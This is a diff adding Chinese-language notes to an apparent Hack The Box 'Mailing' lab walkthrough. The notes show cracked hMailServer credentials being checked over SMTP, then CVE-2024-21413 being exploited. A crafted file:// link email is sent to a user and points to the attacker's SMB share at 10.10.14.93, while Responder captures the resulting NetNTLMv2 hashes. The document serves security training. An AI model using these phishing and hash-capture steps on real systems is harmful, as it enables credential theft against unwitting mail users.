@@ -296,3 +296,220 @@ Candidates.#2....: 0a9f8ad8bf896b501dde74f08efd7e4c -> 0a9f8ad8bf896b501dde74f08
 841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
 
 ```
+#### 这些凭据对服务器上的管理员用户无效：
+```
+[★]$ netexec smb mailing.htb -u administrtor -p 'homenetworkingadministrator'
+SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.129.232.39   445    MAILING          [-] MAILING\administrtor:homenetworkingadministrator STATUS_LOGON_FAILURE
+```
+### 验证邮件密码
+#### 鉴于此凭据来自 hMailServer，它很可能可以用于登录 SMTP 发送邮件。我可以用 Python 验证这一点smtplib：
+```
+[★]$ python3
+Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+>>> import smtplib 
+>>> server = smtplib.SMTP('mailing.htb:587')
+>>> server.login('administrator@mailing.htb', 'homenetworkingadministrator')
+(235, b'authenticated.')
+```
+#### 当尝试使用用户名“administrator”时失败，但当我使用“administrator@mailing.htb”时，它报告成功。
+#### 我还可以使用swaks命令行邮件发送器，并apt install swaks加上相应的标志来避免实际发送任何邮件：--auth--quit-after
+```
+[★]$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
+=== Trying mailing.htb:25...
+=== Connected to mailing.htb.
+<-  220 mailing.htb ESMTP
+ -> EHLO htb-6zy3nzikns
+<-  250-mailing.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN PLAIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+<-  334 UGFzc3dvcmQ6
+ -> aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
+<-  235 authenticated.
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+#### 显示成功。如​​果我更改密码，则失败：
+```
+[★]$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password bad_password --quit-after AUTH --server mailing.htb
+=== Trying mailing.htb:25...
+=== Connected to mailing.htb.
+<-  220 mailing.htb ESMTP
+ -> EHLO htb-6zy3nzikns
+<-  250-mailing.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN PLAIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+<-  334 UGFzc3dvcmQ6
+ -> YmFkX3Bhc3N3b3Jk
+<** 535 Authentication failed. Restarting authentication process.
+*** No authentication type succeeded
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+### CVE-2024-21413
+#### google搜索：windows mail cve
+#### 该 CVE 确实存在，但出现在关于 Outlook 的文章中。这是因为 Outlook 是一款更为常见的邮件客户端。而且，就连NIST关于此 CVE 的页面也指出：
+#### 微软 Outlook 远程代码执行漏洞 不过，这个漏洞确实会影响 Outlook 和 Windows Mail。
+#### Outlook（以及 Windows Mail）针对通过电子邮件传入的不同链接协议采取不同的安全措施。其中一项较为严格的措施是file://协议本身。研究人员发现，如果 URL 以“![任意内容]”结尾，则该安全措施将被失效，链接将直接在未经过额外安全处理的情况下进行处理。这意味着攻击者可以发送此类链接，当用户点击（或有时在预览窗格中打开）时，该链接会尝试向攻击者的 SMB 服务器进行身份验证，从而使攻击者能够捕获 NetNTLMv2 哈希值，并有可能破解用户的密码。
+#### 此漏洞的初步验证将发送一个如下所示的 HTML 正文：
+```
+<html>
+    <body>
+        <img src="{base64_image_string}" alt="Image"><br />
+        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
+    </body>
+    </html>
+```
+#### 只需在预览窗口中打开此链接，Windows Mail 就会尝试{link_url}通过 SMB 加载。
+#### GitHub 上 xaitax 提供了一个可靠的POC 漏洞利用程序，它可以生成 HTML 邮件并发送出去。我会把这个仓库克隆到我的主机上
+```
+[★]$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
+remote: Enumerating objects: 28, done.
+remote: Counting objects: 100% (28/28), done.
+remote: Compressing objects: 100% (27/27), done.
+remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (28/28), 14.48 KiB | 7.24 MiB/s, done.
+Resolving deltas: 100% (7/7), done.
+[★]$ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+[~/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability][★]$ ls
+CVE-2024-21413.py  README.md
+```
+```
+--server mailing.htb -目标服务器。
+--port 587如果我尝试使用 25 端口，脚本会报错：“❌ 邮件发送失败：服务器不支持 STARTTLS 扩展。” 它需要 TLS 协议。587 是 POC 中使用的示例端口README.md。
+--username administrator@mailing.htb -泄露的用户名来自hMailServer.ini.
+--password homenetworkingadministrator -已破解泄露的密码哈希值hMailServer.ini。
+--sender 0xdf@mailing.htb- 没关系。
+--recipient maya@mailing.htb -首先以 Maya 为目标，但也可以尝试其他软件。
+--url "\\10.10.14.6\share\sploit" -必须是我虚拟机上的 SMB 共享，不过具体路径并不重要。
+--subject "Check this out ASAP!" -在这里并不重要，但我希望它是会被打开的东西。
+```
+#### 运行此程序即可发送邮件：
+```
+[★]$ python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender syareya@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.93\share\sploit" --subject "Check this out ASAP!"
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+✅ Email sent successfully.
+```
+#### 为了捕获对我的主机的身份验证尝试，我将运行Responder：
+```
+[★]$ git clone https://github.com/SpiderLabs/Responder  //这个是python2.7的慎用
+
+
+[★]$ sudo su
+#git clone https://github.com/lgandx/Responder.git
+Cloning into 'Responder'...
+remote: Enumerating objects: 2757, done.
+remote: Counting objects: 100% (917/917), done.
+remote: Compressing objects: 100% (364/364), done.
+remote: Total 2757 (delta 694), reused 553 (delta 553), pack-reused 1840 (from 5)
+Receiving objects: 100% (2757/2757), 2.76 MiB | 21.28 MiB/s, done.
+
+#cd Responder
+[/home/syareya55/Responder]#ls
+certs         LICENSE          poisoners         Responder.conf  utils.py
+CHANGELOG.md  logs             pyproject.toml    Responder.py
+Contributors  odict.py         README.md         servers
+DumpHash.py   OSX_launcher.sh  Report.py         settings.py
+files         packets.py       requirements.txt  tools
+
+[/home/syareya55/Responder]#python3 -m pip --version
+[/home/syareya55/Responder]#sudo pip3 install aioquic
+```
+#### 运行
+```
+
+[★]$ cd Responder 
+[~/Responder][★]$ sudo ./Responder.py -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[*] Tips jar:
+    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+    DHCPv6                     [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.93]
+    Responder IPv6             [fe80::1019:d048:70ed:d8a6]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-T0903FQJW6N]
+    Responder Domain Name      [URCQ.LOCAL]
+    Responder DCE-RPC Port     [47028]
+
+[*] Version: Responder 3.2.1.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+
+
+
+
+```
